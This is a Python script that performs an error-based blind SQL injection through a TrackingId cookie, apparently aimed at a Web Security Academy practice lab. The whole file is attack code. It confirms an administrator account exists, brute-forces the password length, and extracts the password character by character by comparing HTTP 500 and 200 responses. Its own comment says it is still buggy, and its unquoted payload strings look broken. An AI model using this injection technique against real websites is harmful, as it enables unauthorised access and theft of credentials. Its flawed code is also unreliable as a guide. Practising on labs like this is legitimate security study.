# Each time it hits 500 status code, it means that the condition is accepted resulting in to_char(1/0) being executed resultin in an error.
# When it hits 200 status code, it means the condition is false thus to_char(1/0) is not executed resulting the page being loaded.
# We just have blindly abuse the condition.
# STILL BUGGY..STATUS ALWAYS RETURN 500

import requests
import json
import string

check = list(string.ascii_lowercase) + list(map(str, range(10)))
flag = ''
current_index = 1;
current_len = 0
url = 'https://acee1f771f2415f980e61099003400c4.web-security-academy.net/'
user = 'administrator' # change this, or just load a wordlist, perhaps ill modify the script later
atk = False

print(f"Confirming theres a user called {user}..")

payload = f"'UNION SELECT CASE WHEN (username={user}) THEN to_char(1/0) ELSE NULL END FROM users -- "

header = {
    "Host": "acee1f771f2415f980e61099003400c4.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate",
	"Connection": "close",
	"Cookie": f"TrackingId={payload}; session=jvJ0WQzRuehHvZnI4LjisoiFXjJ2S1WR",
	"Cache-Control": "max-age=0",
	"Upgrade-Insecure-Requests": "1"
}

r = requests.get(url, headers=header)

if r.status_code == 500:
	atk=True
	print(f"There's a user called {user}")
else:
	print("Guess another user")

r.close()


if atk:

	print("Finding password length..")
	while True:

		payload = f"' UNION SELECT CASE WHEN (username={user} AND length(password) > {current_len}) THEN to_char(1/0) ELSE NULL END FROM users -- "
		header = {
		    "Host": "acee1f771f2415f980e61099003400c4.web-security-academy.net",
		    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
		    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.5",
			"Accept-Encoding": "gzip, deflate",
			"Connection": "close",
			"Cookie": f"TrackingId={payload}; session=jvJ0WQzRuehHvZnI4LjisoiFXjJ2S1WR",
			"Cache-Control": "max-age=0",
			"Upgrade-Insecure-Requests": "1"
		}

		r = requests.get(url, headers=header)
		print(r.status_code)
		if r.status_code == 500:
			current_len += 1
			r.close()
		else:
			break
		

	print(f'Password length is {current_len} character!')

	print("Injecting..")

	while True:

		for x in check:

			payload = f"'UNION SELECT CASE WHEN (username={user} AND substr(password,1,{current_index}) = {flag+x}) THEN to_char(1/0) ELSE NULL END FROM users -- "
			header = {
			    "Host": "acee1f771f2415f980e61099003400c4.web-security-academy.net",
			    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
			    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				"Accept-Language": "en-US,en;q=0.5",
				"Accept-Encoding": "gzip, deflate",
				"Connection": "close",
				"Cookie": f"TrackingId={payload}; session=jvJ0WQzRuehHvZnI4LjisoiFXjJ2S1WR",
				"Cache-Control": "max-age=0",
				"Upgrade-Insecure-Requests": "1"
			}

			r = requests.get(url, headers=header)

			if r.status_code == 500:

				flag += x
				print(f"Current password: {flag}")
				current_index += 1
				r.close()

				break

		if len(flag) == current_len:
			print("Hacking finish!")
			print("Enjoy the creds")
			print(f"administrator:{flag}")
			break;












